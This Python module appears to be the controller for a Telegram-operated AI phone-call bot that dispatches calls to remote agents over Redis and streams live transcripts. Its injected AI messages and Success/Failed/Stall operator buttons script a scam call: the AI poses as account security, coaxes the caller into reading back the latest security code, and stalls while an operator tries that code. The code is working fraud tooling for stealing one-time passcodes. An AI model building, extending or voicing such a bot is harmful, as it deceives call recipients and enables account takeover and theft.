"""
Controller-side distributed /call: dispatch a call job to an agent and
bridge the live transcript / status / operator controls over Redis.

Events  channel  gv:call:<id>:events   (agent  -> controller)
Control channel  gv:call:<id>:control  (controller -> agent)

Standalone /call is untouched (call.py keeps its local path).
"""
import asyncio
import os
import time

from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from loguru import logger

# Operator → injected AI message (must match the standalone mapping).
INJECT_MESSAGES = {
    "op_success": "The security code just worked. Michael's account is "
                  "secured. Finish the call professionally and warmly.",
    "op_failed": "The system rejected that code. It might be expired. Calmly "
                 "ask the caller to check for the LATEST code and read it back.",
    "op_stall": "I'm just syncing the security tokens on my end Michael, "
                "stay with me—this only takes a second.",
}


def _kbd(call_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Success", callback_data=f"op_success:{call_id}"),
        InlineKeyboardButton("❌ Failed", callback_data=f"op_failed:{call_id}"),
        InlineKeyboardButton("⌛ Stall", callback_data=f"op_stall:{call_id}"),
    ]])


def _sanitize(t: str) -> str:
    return (t or "").replace("\\", "\\\\").replace("*", "\\*") \
        .replace("_", "\\_").replace("`", "\\`").replace("[", "\\[")


def _render(call_id: str, agent_id: str, phone_masked: str,
            status: str, transcript: list) -> str:
    lines = [
        "📞 *Call (remote)*",
        "━━━━━━━━━━━━━━━━━━",
        f"🆔 `{call_id}`  ·  🖥️ `{agent_id}`",
        f"📞 `{phone_masked}`",
        f"📊 Status: {status}",
    ]
    if transcript:
        lines.append("━━━━━━━━━━━━━━━━━━")
        lines.append("💬 *Live transcript:*")
        for t in transcript[-6:]:
            who = {"user": "Caller", "ai": "AI", "sniper": "🎯"} \
                .get(t.get("speaker"), t.get("speaker", "?"))
            lines.append(f"*{who}*: {_sanitize(t.get('text', ''))}")
    return "\n".join(lines)


async def is_remote_call(context, call_id: str) -> bool:
    return call_id in context.bot_data.get("remote_calls", {})


async def route_operator(context, bus, call_id: str, action: str) -> bool:
    if call_id not in context.bot_data.get("remote_calls", {}):
        return False
    await bus.publish_call_control(call_id, {"action": action})
    return True


async def route_hangup(context, bus, call_id: str) -> bool:
    if call_id not in context.bot_data.get("remote_calls", {}):
        return False
    await bus.publish_call_control(call_id, {"action": "hangup"})
    return True


async def start_remote_call(context, bus, *, call_id, phone, masked,
                            prompt_data, call_vars, chat_id, msg_id):
    system_prompt = prompt_data.get(
        "content", "You are a helpful AI phone assistant."
    )
    greeting = prompt_data.get("greeting", "")
    for k, v in (call_vars or {}).items():
        system_prompt = system_prompt.replace("{" + k + "}", v)
        greeting = greeting.replace("{" + k + "}", v)

    agent_id = await bus.pick_agent()
    if not agent_id:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text="❌ No agent with a free worker is available.",
        )
        return

    remote = context.bot_data.setdefault("remote_calls", {})
    remote[call_id] = {
        "chat_id": chat_id, "message_id": msg_id, "agent_id": agent_id,
        "transcript": [], "status": "🔄 connecting", "ended": False,
    }

    await bus.dispatch_job(agent_id, {
        "type": "call",
        "params": {
            "call_id": call_id, "phone": phone, "masked": masked,
            "system_prompt": system_prompt, "greeting": greeting,
        },
    })
    context.application.create_task(
        _bridge(context, bus, call_id, masked, agent_id)
    )


async def _bridge(context, bus, call_id, masked, agent_id):
    ps = await bus.subscribe(f"gv:call:{call_id}:events")
    state = context.bot_data["remote_calls"][call_id]
    timeout = int(os.getenv("GV_CALL_TIMEOUT_SEC", "1800"))
    deadline = time.time() + timeout
    last_edit = 0.0
    dirty = False

    async def flush(force=False):
        nonlocal last_edit, dirty
        now = time.time()
        if not force and (now - last_edit) < 1.5:
            return
        last_edit = now
        dirty = False
        try:
            await context.bot.edit_message_text(
                chat_id=state["chat_id"], message_id=state["message_id"],
                text=_render(call_id, agent_id, masked,
                             state["status"], state["transcript"]),
                parse_mode="Markdown",
                reply_markup=_kbd(call_id) if not state["ended"] else None,
            )
        except Exception as e:
            logger.debug(f"call bridge edit failed: {e}")

    try:
        while not state["ended"] and time.time() < deadline:
            ev = await bus.next_message(ps, timeout=1.0)
            if ev is None:
                if dirty:
                    await flush()
                continue
            t = ev.get("t")
            if t == "status":
                state["status"] = ev.get("status", state["status"])
                await flush(force=True)
            elif t == "transcript":
                state["transcript"].append({
                    "speaker": ev.get("speaker"), "text": ev.get("text", ""),
                })
                if len(state["transcript"]) > 200:
                    state["transcript"] = state["transcript"][-100:]
                dirty = True
            elif t in ("ended", "error"):
                state["ended"] = True
                state["status"] = (
                    f"📴 ended ({ev.get('reason') or ev.get('error') or 'done'})"
                )
                await flush(force=True)
                break
        if not state["ended"]:
            state["ended"] = True
            state["status"] = "📴 ended (timeout)"
            await flush(force=True)
    finally:
        try:
            await ps.unsubscribe()
            await ps.aclose()
        except Exception:
            pass
        context.bot_data.get("remote_calls", {}).pop(call_id, None)
